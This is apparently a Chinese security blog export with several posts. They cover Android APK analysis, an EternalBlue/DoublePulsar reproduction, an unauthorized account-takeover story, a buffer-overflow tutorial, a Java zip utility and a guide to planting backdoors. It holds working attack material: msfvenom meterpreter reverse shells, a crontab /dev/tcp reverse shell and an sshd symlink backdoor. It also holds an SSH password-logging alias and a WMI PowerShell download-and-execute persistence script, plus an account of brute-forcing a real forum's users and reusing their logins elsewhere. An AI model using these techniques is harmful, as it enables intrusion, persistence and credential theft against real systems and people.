// Get verbose device information $ run information.permissions // Get a list of all permissions used by packages on the device $ run scanner.activity.browsable // Get all BROWSABLE activities that can be invoked from the web browser $ run scanner.misc.native // Find native components included in packages $ run scanner.misc.readablefiles // Find world-readable files in the given folder $ run scanner.misc.secretcodes // Search for secret codes that can be used from the dialer $ run scanner.misc.sflagbinaries // Find suid/sgid binaries in the given folder (default is /system). $ run scanner.misc.writablefiles // Find world-writable files in the given folder $ run scanner.provider.finduris // Search for content providers that can be queried from our context. $ run scanner.provider.injection // Test content providers for SQL injection vulnerabilities. $ run scanner.provider.sqltables // Find tables accessible through SQL injection vulnerabilities. $ run scanner.provider.traversal // Test content providers for basic directory traversal vulnerabilities. $ run shell.exec // Execute a single Linux command. $ run shell.send // Send an ASH shell to a remote listener. $ run shell.start // Enter into an interactive Linux shell. $ run tools.file.download // Download a File $ run tools.file.md5sum // Get md5 Checksum of file $ run tools.file.size // Get size of file $ run tools.file.upload // Upload a File $ run tools.setup.busybox // Install Busybox. $ run tools.setup.minimalsu // Prepare 'minimal-su' binary installation on the device. androguardandroguard (Android guard) 是 Android 应用程序的逆向工程，提供恶意软件分析等等功能，androguard 主要由 Python 编写。 androguard 主要有以下功能： 1234567androrisk.py // 该模块用于分析apk危险级别androapkinfo.py // 该模块分析apk列出其中的文件类型、权限、4大组件、是否NDK反射等信息androaxml.py // 该模块用于展示apk androidmanifest.xmlandrogexf.py // 该模块生成函数调用图apkviewer.py // 该模块生成指令级别的调用图androlyze.py // 该模块为交互分析环境androdiff.py // 分析2个apk的不同之处,检测app是否遭到修改 androapkinfo.py该模块分析apk列出其中的文件类型、权限、4大组件、是否NDK反射等信息 1$ python androapkinfo.py -i app-release.apk androlyze.py该模块为交互分析环境 1$ python androlyze.py -i app-release.apk -x 123$ python androlyze.py -s$ a,d,dx = AnalyzeAPK("Desktop/app-release.apk")$ print a,d,dx 12$ d,dx = AnalyzeDex("Desktop/classes.dex")$ print d,dx 等等，可以使用tab键 androdd.py查看apk文件结构 按照指定格式显示androidapk的所有类和子方法的信息流 1$ python androdd.py -i app-release.apk -o out -f png androgexf.pyandrogexf.py 将方法信息之间的连接状态转换成gexf格式 1$ androgexf.py -i app-release.apk -o apk.gexf androdiff.pyandrodiff.py 分析2个apk的不同之处,检测app是否遭到修改 1$ python androdiff.py -i app-release1.apk app-release2.apk 工具集一、santoku 操作系统 santoku 实质是一款定制的 Ubuntu 12.04 系统镜像，类似于KALI，与其它Ubuntu系统相比，它具有如下特点： 1.集成了大量主流的Android程序分析工具，为分析人员节省分析环境配置所需的时间。2.集成移动设备取证工具。支持Android、IPhone 等移动设备的取证工作。3.集成渗透测试工具。4.集成网络数据分析工具。在分析 Android病毒、木马等程序时，这些工具特别有用。5.采用 LXDE 作为系统的桌面环境，界面与 Windows XP非常相似，符合中国人使用习惯。6.正处于beta 阶段，但整个项目显得很有活力，相信将来的更新和维护也会不错。 二、APKIDE APKIDE这是一个大佬们集成的一个APK的测试工具集，包含了常用的大部分工具，例如adb、apktool等。 基础操作签名前面介绍过，META-INF这个文件主要与签名、证书有关。 对APP进行签名一、删除apk中的META-INF文件夹，然后重新zip压缩成apk二、创建密钥存储器（已经有的可以跳过） 1$ keytool -genkey -v -keystore 【keystore名称】 -alias 【密钥别名】 -keyalg RSA -keysize 2048 -validity 【有效天数】 三、使用密钥存储器对app进行签名 1$ jarsigner -verbose -sigalg MD5withRSA -digestalg SHA1 -keystore 【keystore名称】 【apk文件】 【密钥别名】 签名成功后会重新出现META-INF文件夹 查看APP的签名解压APK文件，使用JDK的keytool来查看META-INF/CERT.RSA文件内容 1$ keytool -printcert -file 【证书】 验证APP的签名1$ jarsigner -verify -verbose 【apk存放路径】 查看AndroidManifest.xml文件1$ java -jar apktool.jar d -f s 【APK地址】 静态调试一、将apk文件转化为jar文件 1$ dex-jar.bat 【apk】 二、jd-gui.exe 可反编译jar文件 动态调试一、将apk转换成smali代码 1$ java -jar apktool.jar d 【APK地址】 -o out 二、修改AndroidManifest.xml中的Android:debuggable=”true” 三、在入口处添加waitForDebugger代码进行调试等待 这里说的入口处，就是程序启动的地方，就是我们一般的入口Activity，查找这个Activity的话，方法太多了，比如我们这里直接从上面得到的AndroidManifest.xml中找到，因为入口Activity的action和category是固定的。 找到入口Activity之后，我们直接在他的onCreate方法的第一行加上waitForDebugger代码即可，找到对应的MainActivity的smali源码：然后添加一行代码： 1invoke-static &#123;&#125;, Landroid/os/Debug;-&gt;waitForDebugger()V // 相当于java的 android.os.Debug.waitForDebugger(); 四、将smali 转换成apk 1$ java -jar apktool.jar b 【路径】 【目标路径】 五、重新签名 1$ jarsigner -verbose -sigalg MD5withRSA -digestalg SHA1 -keystore 【keystore名称】 【apk文件】 【密钥别名】 六、安装apk 1$ adb install 【apk】 七、android studio 导入此项目，需要配置gradle，可参考文章 路径一般为 home\.gradle\wrapper\dists\gradle-x.x-all\xxxxxxxxxxxxx\gradle-x.x 八、配置android studio调试配置，Run-&gt;Edit configurations，点击+号，新建remote类型调试器，设置Name， 修改端口号，可以选择被占用的任意端口，本次设置为62002 九、运行指定的Activity 1$ adb shell am start -D -n com.zjhcsoft.android.eip/.MainActivity 十、查找相应的apk进程 1$ adb shell ps | findstr eip 十一、设置端口转发 1$ adb forward tcp:62002 jdwp:17304 这条命令的含义可以认为是在本地62002端口与手机17304进程之间建立一条通道，当开始调试时，AS连接本地的8800端口，通过这条通道控制程序的运行 十二、设置断点 十三、调试 run-&gt;debug选择刚才新增的调试器，此时程序会断在设置的断点的行，调试器解密如下 渗透测试中注意的点废话不说，直接上图好了。 总结毕竟还只是刚入门，学的时间也不是很久，就先总结到这，之后在进行渗透测试方面的练习以及案例的补充。]]></content>
      <categories>
        <category>android</category>
      </categories>
      <tags>
        <tag>android</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2017 Equation Group 0day Tools]]></title>
    <url>%2F2017%2F04%2F22%2Fequation-group-0day-2017%2F</url>
    <content type="text"><![CDATA[概述Shadow Brokers黑客组织上周泄露了NSA方程式组织的一些工具，其中某些工具客直接拿下Windows服务器 。 工具包安装 下载安装 python-2.6.6.msi ,pywin32-221.win32-py2.6.exe 。 下载解压 shadowbroker 。 在 shadowbroker 的 windows 目录下新建 listeningposts 目录。 工具包简介 swift 银行攻击的证据 oddjob 植入后门等相关文档 windows 包含了各种漏洞利用工具 最主要还是Windows目录，其包含了各种漏洞利用工具，在exploits中包含了丰富的漏洞利用工具，可影响windows多个平台。 Exploits包含了很多漏洞利用工具，经过大佬们的初步梳理，重点关注对win server有影响的几个工具。 Tools Service Port Describe Explodingcan IIS IIS漏洞利用工具，只对Windows 2003有影响 Eternalromance 139和445 MS17-010 SMB 和 NBT漏洞利用工具 Emphasismine 143 通过ICMP漏洞工具 Englishmansdentist SMTP(25) 通过SMTP漏洞工具 Erraticgopher RPC(445) 通过RPC漏洞工具 Eskimoroll 88 MS14-068 漏洞利用工具，通过kerberos入侵 Eclipsedwing SMB(445) MS08-67 漏洞利用工具 Educatedscholar SMB(445) MS09-050 漏洞利用工具 Emeraldthread 139和445 MS10-061 MB和 Netbios 漏洞利用工具 Zippybeer SMB(445) SMTP漏洞利用工具 Eternalsynergy SMB(445) MS17-010 SMB漏洞利用工具 Esteemaudit RDP(3389) RDP漏洞利用工具 FUZZBUNCH是一个类似 MSF的漏洞利用平台工具，python编写。 Specials Tools Service Port Describe ETERNALBLUE SMB(445) SMB漏洞利用工具，xp、2003、2008、7均有部分覆盖(MS17-010) ETERNALCHAMPION SMB(445) SMB漏洞利用工具，xp、2003、2008、7均有部分覆盖(CVE-2017-0146/0147) ETERNALBLUE实验环境攻击机1 win7 64 旗舰版 python-2.6.6.msi pywin32-221.win32-py2.6.exe shadowbroker IP : 192.168.111.155 攻击机2 kali 2016.2 IP : 192.168.111.144 靶机 win2008 IP : 192.168.111.158 systeminfo 信息如下： 复现过程初始化配置，创建一个攻击项目。 使用 ETERNALBLUE 模块。 使用 DoublePulsar 模块。 DoublePulsar是一个后门程序，用于在已感染的系统上注入和运行恶意代码。这是一种NSA用作监听使用的后门程序，如今在GitHub上得到免费发布后，任何人均可使用。其软件是在Windows XP到Server 2008 R2系统版本中的计算机上，通过使用EternalBlue Exploit的SMB文件共享服务端口启动旧版本下的远程执行代码RCE，随后进行程序的安装。也就是说，会受到攻击影响的计算机系统是存在漏洞的Windows版本，因为这给攻击者提供了其SMB端口。 这里要选择SMB和对应的目标操作系统位数下面的话是攻击的4个操作 选择RunDLL。 这里用攻击机2 kali的msfvenom 生成一下dll 这里使用的是reverse_tcp的paylaod 可以根据网络情况采用其他payload 1$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.111.144 LPORT=5555 -f dll &gt; s.dll 把生成的s.dll传到攻击机1上去， 然后kali开启msfconsole 监听，下面的payload要和上面msfvenom的payload对应起来 123456$ msfconsole msf &gt; use exploit/multi/handler msf &gt; set LHOST 192.168.111.144 msf &gt; set LPORT 5555 msf &gt; set PAYLOAD windows/x64/meterpreter/reverse_tcp msf &gt; exploit 然后操作fb.py ，加载s.dll。 kali 收到反弹的shell 。 总结当然，还有其他的攻击模块，下次继续更新。 为了平时的渗透测试的方便，我临时写了个检测的脚本（测试版）,供大家测试使用。 参考ShadowBrokers方程式工具包浅析，揭秘方程式组织工具包的前世今生方程式 0day ETERNALBLUE 复现过程]]></content>
      <categories>
        <category>code execution</category>
      </categories>
      <tags>
        <tag>windows</tag>
        <tag>equation group</tag>
        <tag>code execution</tag>
        <tag>eternalBlue</tag>
        <tag>doublePulsar</tag>
        <tag>tool</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Dizcus Pentest]]></title>
    <url>%2F2017%2F04%2F04%2Fdizcus-pentest%2F</url>
    <content type="text"><![CDATA[概述某次看大佬们聊天时聊到某个站，于是赶紧上去看看。 过程看看下这个站，并没找到什么能getshell的办法，好气啊。只能想想其他思路了。偶然发现可以查看其他人的个人资料以及交的会员费等详情。于是搞了个python脚本爬了下所有交了会员费的用户。 发现用户登录的地方没有验证码限制，但是有登陆错误次数限制。 可以确定这个网站用户登录的地方的登陆限制是通过IP和用户名一起的，意思是同一个ip或者同一个用户只能错误登陆5次，之后便锁定了。 IP可以用X-Forwarded-For绕过，但是用户名没办法。 既然这样的话，那就试下用户名和密码一样的吧，看看这样能不能得到一些信息。 由于之前爬下来的账户显示的是昵称，假如没有昵称就显示用户名，这里刚好可以利用这点进行BurpSuite爆破。 OK，发现还是得到了一些用户的信息，试了下，可以登录，发现还不少。 当然，登陆之后还能看到用户邮箱的一些信息，进行了一下社工，部分账号可以登录12306等网站。 后来发现这种方式可以针对大部分的dizcus进行利用。 总结技术还是有所欠缺，还是得继续学习。]]></content>
      <categories>
        <category>pentest</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>pentest</tag>
        <tag>dizcus</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 溢出]]></title>
    <url>%2F2017%2F03%2F11%2Flinux-overflow%2F</url>
    <content type="text"><![CDATA[概述Linux下的溢出学习。 目标代码12345678910111213141516171819202122232425262728293031#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt; const char pass[] = "IloveIS2013@ZJGSU"; /* Password */ void authorized()&#123; printf( "You have been authorized!\n" );&#125; void getInput()&#123; char buffer[20]; gets( buffer ); if ( strcmp( pass, buffer ) == 0 ) &#123; authorized(); &#125; else printf("Your password is wrong!\n");&#125; int main()&#123; getInput(); return(0);&#125; 代码很简单，用户输入一个密码，然后程序把它加密起来，并且和程序中存储的密码对比，如果成功了，就调用authorized()函数，就当这个authorized()函数是用来让用户在登录后干一些敏感操作的好了。 1gcc -ggdb -fno-stack-protector -z execstack overflow.c -lcrypt -o overflow 步骤 程序分配20字节的缓冲区，然后把用户输入存储到这个缓冲区里面，然后调用函数把它加密，再和程序里的密码对比。 我们编译的时候会被编译器提示gets()不安全，事实上也是，因为它并没有做任何边界检查，所以我们就用它来调用漏洞了。 我们用objdump来dump一下生成的机器码，看看这儿它做了什么objdump -d -M intel overflow 现在我们所有要做的就是把getInput的返回地址覆盖为0x0000000000400636，而且我们可以做到。我们可 以在shell里用printf把数据传给程序，你可以用\x来转意16进制数据，因为地址是倒着来的（注：小端），所以我们也倒着给它就好了。还有，我 们需要用0x00来终止我们的缓存，这样strcmp就不会在我们函数返回之前引起一个段错误。printf的结果如下： 我们可以知道authorized()函数事实上已经执行成功了。]]></content>
      <categories>
        <category>overflow</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>overflow</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Java Zip]]></title>
    <url>%2F2017%2F03%2F10%2Fjava-zip%2F</url>
    <content type="text"><![CDATA[概述由于最近毕业设计的需要，需要使用到Zip的解压、压缩功能，还要有能加密解密，所以去找了相关的Java zip的包，封装了下。 需要Java Zip 解压、压缩的功能，需要用到zip4j这个jar文件，当然，我使用maven直接下载的。 在pom.xml里直接添加如下代码就好了： 12345&lt;dependency&gt; &lt;groupId&gt;net.lingala.zip4j&lt;/groupId&gt; &lt;artifactId&gt;zip4j&lt;/artifactId&gt; &lt;version&gt;1.3.2&lt;/version&gt;&lt;/dependency&gt; 代码好了，直接上代码：package com.orleven.tentacle.util;import java.io.File;import java.util.ArrayList;import java.util.List;import net.lingala.zip4j.core.ZipFile;import net.lingala.zip4j.exception.ZipException;import net.lingala.zip4j.model.FileHeader;import net.lingala.zip4j.model.ZipParameters;import net.lingala.zip4j.util.Zip4jConstants;/** * Zip 处理工具包 * 需要注意的是如果压缩包里已经存在要添加的文件，会陷入死循环，所以添加之前要先判断一下。 * @author orleven * @date 2017年3月8日 */public class ZipUtil &#123; /** * 添加文件夹到zip中 * @param inPath * @param outPath * @param password * @return */ public static boolean addFoldInZip(String inPath,String storagePath,String outPath,String password) &#123; try &#123; ZipFile zipFile = new ZipFile(outPath); ZipParameters parameters = new ZipParameters(); parameters.setCompressionMethod(Zip4jConstants.COMP_DEFLATE); parameters.setCompressionLevel(Zip4jConstants.DEFLATE_LEVEL_NORMAL); parameters.setRootFolderInZip(storagePath); ; if(password!=null&amp;&amp;!password.equals(""))&#123; parameters.setEncryptFiles(true); parameters.setEncryptionMethod(Zip4jConstants.ENC_METHOD_AES); parameters.setAesKeyStrength(Zip4jConstants.AES_STRENGTH_256); parameters.setPassword(password); &#125; zipFile.addFolder(inPath, parameters); return true; &#125; catch (ZipException e) &#123; e.printStackTrace(); return false; &#125; &#125; /** * 添加文件到zip中指定的文件夹中 * @param inPath * @param storagePath * @param outPath * @param password * @return */ public static boolean addFileInZip(String inPath,String storagePath,String outPath,String password) &#123; try &#123; ZipFile zipFile = new ZipFile(outPath); File inFile = new File(inPath); ZipParameters parameters = new ZipParameters(); parameters.setCompressionMethod(Zip4jConstants.COMP_DEFLATE); // set compression method to deflate compression parameters.setCompressionLevel(Zip4jConstants.DEFLATE_LEVEL_NORMAL); parameters.setRootFolderInZip(storagePath); if(password!=null&amp;&amp;!password.equals(""))&#123; parameters.setEncryptFiles(true); parameters.setEncryptionMethod(Zip4jConstants.ENC_METHOD_AES); parameters.setAesKeyStrength(Zip4jConstants.AES_STRENGTH_256); parameters.setPassword(password); &#125; zipFile.addFile(inFile, parameters); return true; &#125; catch (ZipException e) &#123; e.printStackTrace(); return false; &#125; &#125; /** * 添加多个文件到zip中指定的文件夹中 * @param inPath * @param storagePath * @param outPath * @param password * @return */ public static boolean addFilesInZip(ArrayList&lt;File&gt; inFiles,String storagePath,String outPath,String password) &#123; try &#123; ArrayList filesToAdd = new ArrayList(); ZipFile zipFile = new ZipFile(outPath); ZipParameters parameters = new ZipParameters(); parameters.setCompressionMethod(Zip4jConstants.COMP_DEFLATE); // set compression method to deflate compression parameters.setCompressionLevel(Zip4jConstants.DEFLATE_LEVEL_NORMAL); parameters.setRootFolderInZip(storagePath); if(password!=null&amp;&amp;!password.equals(""))&#123; parameters.setEncryptFiles(true); parameters.setEncryptionMethod(Zip4jConstants.ENC_METHOD_AES); parameters.setAesKeyStrength(Zip4jConstants.AES_STRENGTH_256); parameters.setPassword(password); &#125; zipFile.addFiles(inFiles, parameters); return true; &#125; catch (ZipException e) &#123; e.printStackTrace(); return false; &#125; &#125; /** * 从zip中删除文件 * @param inPath * @param outPath * @param password * @return */ public static boolean removeFileInZip(String inPath,String storagePath,String password) &#123; try &#123; ZipFile zipFile = new ZipFile(inPath); if (zipFile.isEncrypted()) &#123; zipFile.setPassword(password); &#125; List fileHeaderList = zipFile.getFileHeaders(); storagePath = storagePath.replaceAll("\\\\", "/"); for (int i =fileHeaderList.size() -1; i&gt;0 ; i--) &#123; FileHeader fileHeader = (FileHeader)fileHeaderList.get(i); if(fileHeader.getFileName().indexOf(storagePath)==0)&#123; System.out.println("Name: " + fileHeader.getFileName()); zipFile.removeFile(fileHeader.getFileName()); &#125; &#125; return true; &#125; catch (ZipException e) &#123; e.printStackTrace(); return false; &#125; &#125; /** * 查看压缩包的文件列表 * @param inPath * @param password * @return */ public static boolean getNameFromZip(String inPath,String password) &#123; try &#123; ZipFile zipFile = new ZipFile(inPath); if (zipFile.isEncrypted()) &#123; zipFile.setPassword(password); &#125; List fileHeaderList = zipFile.getFileHeaders(); for (int i = 0; i &lt; fileHeaderList.size(); i++) &#123; FileHeader fileHeader = (FileHeader)fileHeaderList.get(i); System.out.println("Name: " + fileHeader.getFileName()); System.out.println("Compressed Size: " + fileHeader.getCompressedSize()); System.out.println("Uncompressed Size: " + fileHeader.getUncompressedSize()); System.out.println("CRC: " + fileHeader.getCrc32()); System.out.println("************************************************************"); &#125; return true; &#125; catch (ZipException e) &#123; e.printStackTrace(); return false; &#125; &#125; /** * 解压zip里的所有文件 * @param inPath * @param outPath * @param password * @return */ public static boolean extractZip(String inPath,String outPath ,String password) &#123; try &#123; ZipFile zipFile = new ZipFile(inPath); if (zipFile.isEncrypted()) &#123; zipFile.setPassword(password); &#125; zipFile.extractAll(outPath); System.out.println(password); return true; &#125; catch (ZipException e) &#123;// e.printStackTrace(); return false; &#125; &#125; /** * 解压zip里的文件 * @param inPath * @param storagePath * @param outPath * @param password * @return */ public static boolean extractFileFromZip(String inPath,String storagePath,String outPath ,String password) &#123; try &#123; ZipFile zipFile = new ZipFile(inPath); if (zipFile.isEncrypted()) &#123; zipFile.setPassword(password); &#125; List fileHeaderList = zipFile.getFileHeaders(); storagePath = storagePath.replaceAll("\\\\", "/"); for (int i =0;i&lt;fileHeaderList.size() ;i++) &#123; FileHeader fileHeader = (FileHeader)fileHeaderList.get(i); if(fileHeader.getFileName().indexOf(storagePath)==0)&#123; zipFile.extractFile(fileHeader, outPath); zipFile.removeFile(fileHeader.getFileName()); &#125; &#125; return true; &#125; catch (ZipException e) &#123; e.printStackTrace(); return false; &#125; &#125; /** * 测试zip 压缩算法 */ public static void main(String[] args) &#123; System.out.println("Zip压缩／解压缩测试"); // System.out.println("添加文件夹压缩文件"); // String inPath = "C:\\Users\\dell\\Desktop\\测试文件"; // String outPath = "C:\\Users\\dell\\Desktop\\test.zip";// String storagePath = null;// String password = "123456";// ZipUtil.addFoldInZip(inPath, storagePath,outPath,password); // System.out.println("添加文件到压缩文件"); // String inPath1 = "C:\\Users\\dell\\Desktop\\IEEE_TPDS2003.docx"; // String outPath1 = "C:\\Users\\dell\\Desktop\\test.zip";// String storagePath1 = null;// String password1 = "";// ZipUtil.addFileInZip(inPath1, storagePath1,outPath1,password1); // System.out.println("删除zip的某个文件"); // String storagePath2 = "测试文件\\毕业论文模板201435"; // String inPath2 = "C:\\Users\\dell\\Desktop\\test.zip";// String password2 = "123456";// ZipUtil.removeFileInZip(inPath2, storagePath2, password2); // System.out.println("查看zip文件中的内容"); // String inPath3 = "C:\\Users\\dell\\Desktop\\test.zip"; // String password3 = "123456";// ZipUtil.getNameFromZip(inPath3,password3); // System.out.println("解压压缩文件"); // String inPath4 = "C:\\Users\\dell\\Desktop\\www.zip"; // String outPath4 = "C:\\Users\\dell\\Desktop\\"; // String password4 = "123456";// ZipUtil.extractZip(inPath4, outPath4, password4); // System.out.println("解压zip中的某个文件"); // String inPath5 = "C:\\Users\\dell\\Desktop\\test.zip"; // String outPath5 = "C:\\Users\\dell\\Desktop\\"; // String password5 = "123456";// String storagePath5 = "测试文件\\毕业论文模板201435";// ZipUtil.extractFileFromZip(inPath5, storagePath5, outPath5, password5); System.out.println("已经输出！"); &#125;&#125;]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>zip</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Backdoor 基础]]></title>
    <url>%2F2017%2F01%2F21%2Fbackdoor-base%2F</url>
    <content type="text"><![CDATA[概述 没有最好的后门，只有最合适的后门。 在整体架构上，一个优秀的后门应该充分考虑其功能、触发方式和通信方式等方面。针对不同的方面，杀软也会根据其特征进行处理。为了进一步的持续性控制以及后渗透，后门越显复杂化。从后门的发展史中可看出，这是一场攻与防的持续性较量，简单来说，渗透测试拿下服务器后，怎么能不留后门呢。当然，这是玩笑话。 分类 终端平台：Linux型、Windows型和IOT型； Linux：配置型、logger型和rookit型； Windows：Registry型、Schtasks型和WMI型； 通信方式：http/https型、irc型、dns型、icmp型等。 网站应用：模块扩展型、后端语言型和配置文件型。 终端平台Linux配置型这里的配置型是指借助Linux系统本身的一些特性来完成后门布置功能。 crontab运维经常会用到该命令，这相当于windows的计划任务，规定时间来执行指定命令。这通常与反弹shell一起运用。 1$ (crontab -l;printf "*/5 * * * * exec9&lt;&gt; /dev/tcp/localhost/8080&amp;&amp;exec0&lt;&amp;9&amp;&amp;exec1&gt;&amp;92&gt;&amp;1&amp;&amp;/bin/bash --noprofile –I;\rno crontab for `whoami`%100c\n")|crontab - ssh公钥免密将客户端生成的ssh公钥写到所控服务器的~/.ssh/authorized_keys中，然后客户端利用私钥完成认证即可登录。 123$ ssh-keygen -t rsa$ lsid_rsa id_rsa.pub 把id_rsa.pub写入服务端的authorized_keys中，并修改好相应权限。 12$ chmod 600 ~/.ssh/authorized_keys$ chmod 700 ~/.ssh 这种后门的特点是简单易用，但在实战中会被服务器的配置环境所限制，以及容易被发现。 软连接后门1$ ln -sf /usr/sbin/sshd /tmp/su; /tmp/su -oPort=5555; 经典后门。直接对sshd建立软连接，之后用任意密码登录即可。 1ssh root@x.x.x.x -p 5555 但这隐蔽性很弱，一般的rookit hunter这类的防护脚本可扫描到。 SSH Server wrapper123456789101112$ cd /usr/sbin/$ mv sshd ../bin$ vim sshd#!/usr/bin/perlexec"/bin/sh"if(getpeername(STDIN)=~/^..LF/);exec&#123;"/usr/bin/sshd"&#125;"/usr/sbin/sshd",@ARGV;``` 赋予权限chmod 755 sshd，最后正向连接：``` bashsocat STDIO TCP4:target_ip:22,sourceport=19526 其中，\x00\x00LF是19526的大端形式，便于传输和处理。原理是从sshd fork出一个子进程，输入输出重定向到套接字，并对连过来的客户端端口进行了判断。隐蔽性比刚刚介绍的软连接后门要好。 logger型alias这种通过替换命令来使得evil效果最大化的用法，一般是通过追踪ssh的系统调用比如read、write等来记录下ssh的操作。 1alias ssh=&apos;strace -o /tmp/sshpwd-`date &apos;+%d%h%m%s&apos;`.log -e read,write,connect -s2048 ssh&apos; 当然，这只是alias后门的一种用法，可根据具体情况举一反三。 pampam是一种认证机制，它可帮助管理员快速方便地配置认证方式，并且无需更改服务程序。这种后门主要是通过pam_unix_auth.c打补丁的方式潜入到正常的pam模块中，以此来记录管理员的帐号密码。搭建方式见下连接。 openssh后门同理，也是下载对应的恶意补丁包，来记录管理员的帐号密码。但该后门与pam后门存在很大的问题是编译环境，有时在实战中会出现各种各样的问题。搭建方式见下连接。 rookit应用级rootkit应用级rookit的主要特点是通过批量替换系统命令来实现隐藏，如替换ls、ps和netstat等命令来隐藏文件、进程和网络连接等，有时会有守护进程来保证后门的稳定性。推荐两款常用的木马：mafix和brookit。如果想要学习linux类木马，推荐阅读orange的tsh源码，基本上涵盖了常规木马应具有的特点。 内核级rookit隐藏性通常要借助对linux系统调用的截获来达到目的，并且难以查杀，难以清除，危害巨大。由于未找到相应例子，遂不做具体分析。 windowswindows后门博大精深，实在不好分类，因为后门常需持久化潜在运行，受到powersploit中persistence脚本的启发，因此采取使用后门的触发方式进行分类，分为registry型、schtasks型和WMI型。 registry型在一般用户权限下，通常是将要执行的后门程序或脚本路径填写到如下注册表的键值中HKCU:Software\Microsoft\Windows\CurrentVersion\Run，键名任意。普通权限即可运行。 不过这老生长谈的后门早已被用烂，360杀软会弹框提示。 schtasks型该类型后门可分为管理员权限和普通用户权限，管理员权限可以设置更多的计划任务，比如重启后运行等。 1schtasks /Create /SC HOURLY /TN Updater /TR $CommandLine 这里比较大的限制是策略问题，只能按照规定的时间来执行相关程序或命令。通常来讲，持久性的APT对于这点要求较高。 WMI型Defcon23的演讲后，WMI型后门的热度在国外迅速蔓延。（强烈推荐使用该类型后门）它是只能由管理员权限运行的后门，一般是用powershell编写。目前以这一触发方式运行的后门是不会引起杀软任何反映的。具体原理可到drops去了解。 该类型后门主要用到了WMI展现出来的两个特征：无文件和无进程。 将core code加密存储于WMI类的property中，而该位置在复杂的CIM 数据库中，这达到了所谓的无文件；将filter和consumer异步绑定在一起，当规定的filter满足条件时，比如间隔1min，那么系统会自动启动一进程（名称为powershell）去执行consumer（后门程序）中的内容，当执行完成后，进程会消失，持续的时间根据后门运行情况而定，一般是几秒，这达到了所谓的无进程。 上述三类的详情代码请参考powersploit现阶段无论再复杂的WMI后门都是围绕上面两点而展开的，最核心的是后者。 下面是比较典型的代码，功能为每分钟执行下载并执行： 1234567891011121314151617181920212223242526272829$Name = &apos;test&apos;# build the filter$TimeExecTime = 60$Query = &quot;SELECT * FROM __InstanceModificationEvent WITHIN$TimeExecTime WHERE TargetInstance ISA &apos;Win32_PerfFormattedData_PerfOS_System&apos;&quot;$NS = &quot;root\subscription&quot;$FilterArgs = @&#123; Name=$Name EventNameSpace=&quot;root\cimv2&quot; QueryLanguage=&quot;WQL&quot; Query=$Query&#125;$Filter = Set-WmiInstance -Namespace $NS -Class &quot;__EventFilter&quot; -Arguments $FilterArgs# build the consumer$ConsumerName = $Name$command = &quot;`$wc = New-Object System.Net.Webclient; `$wc.Headers.Add(&apos;User-Agent&apos;,&apos;Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) Like Gecko&apos;); `$wc.proxy = [System.Net.WebRequest]::DefaultWebProxy; `$wc.proxy.credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials; IEX (`$wc.DownloadString(&apos;$URL&apos;))&quot;#$encCommand = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($command))$commandLine = &quot;C:\\Windows\\System32\\WindowsPowershell\\v1.0\\powershell.exe -NoP -NonI -w hidden -Command $command&quot; $ConsumerArgs = @&#123; Name=$ConsumerName CommandLineTemplate=$commandLine&#125;$consumer = Set-WmiInstance -Class &quot;CommandLineEventConsumer&quot; -Namespace $NS -Arguments $ConsumerArgs#Bind filter and consumer$Args = @&#123; Filter = $Filter Consumer = $consumer&#125;Set-WmiInstance -Class &quot;__FilterToConsumerBinding&quot; -Namespace &quot;root\subscription&quot; -Arguments $Args IOT物联网的脆弱性因Mirai恶意软件的肆用而不断凸显，特别是弱口令的泛滥、致使了大批物联网设备沦陷。其中造成的危害不言而喻，不但可以耗用其资源，更可怕的是可能利用设备本身的功能造成意料不到的伤害。如果单单从技术的角度上讲，Mirai确实是一款非常优秀的恶意软件。在这里，我们只讨论它们的后门特性： 进程对于运行时进程的处理，Mirai采用的是进程名随机，也算是为了不被特征提取所采取的一个措施。 http://p9.qhimg.com/t0147848fcfcfd59340.png 防重启因为IOT设备的特殊性，无法将程序写进设备中，只能驻留在内存里，所以需不能使设备重启。在固件里，有一进程会不断向watchdog进程发送一字节数据，如果没有该操作，设备则会重启。Mirai采取的是关闭watchdog的功能。 http://p4.qhimg.com/t01e96433fc3208ba2b.png 通信协议该过程可以分为上线过程：bot发送\x00\x00\x00\x01，得到回应后再发送\x00；心跳过程：bot间隔60s发送\x00\x00cnc，cnc回应\x00\x00；解析执行：cnc对bot发出的指令里采取了一定的格式。[target_num] 02 [IP] 08 08 08 08 [MASK] 20 [IP] 07 07 07 07 [MASK] 20….. IOT设备后门的重点往往是在其功能的实现上，而不是在后门的persistence上，因为IOT设备一旦被突破，几乎入无人之境，恶意软件会合理地最大化利用其中的资源。 通信方式类后门的网络通信行为同样是防火墙的侦查重点，在复杂的实际环境下，怎么把被控端的数据回传成为了一个难点。对于不同的防火墙，其使用的策略也有些不同。 http/https型目前可以说这是最流行的通信方式，可借用第三方的api来实现回连功能，从很大程度上讲解决了很多困难。像在github star比较高的，如twittor、gcat等，从代码上看不会有太大问题，主要是完成了对相应第三方应用的api调用以及功能的实现，但是这种第三方选取并不合理，它会造成溯源十分容易。先不论gmail的实名制，问题的关键在于被控端只能共享一个或几个gmail帐号，当其中一个被控端被追查后，其它的被控端很可能就处于危险状态。 根据经验来看，如果真要借助第三方的网站来完成通信，比较常用的是论坛、网盘等，可以将被控端各自的权限分离开来。在很多APT报告中，我们可看到dropbox及reddit快成为远控木马的重灾区，官方当然也出台了一些措施来制止这种行为。 这部分木马可参考nishang框架中的HTTP-Backdoor脚本。 总的来讲，这种适合于比较小型的，不适合于大型僵尸网络。在国内这种类型的网站基本需要实名制，以官方的力量来追踪是十分容易的。危害小则被封号，大则查水表。 目前对于追踪的问题主流采取的是DGA(Domain Generation Algorithm)，自建服务器。 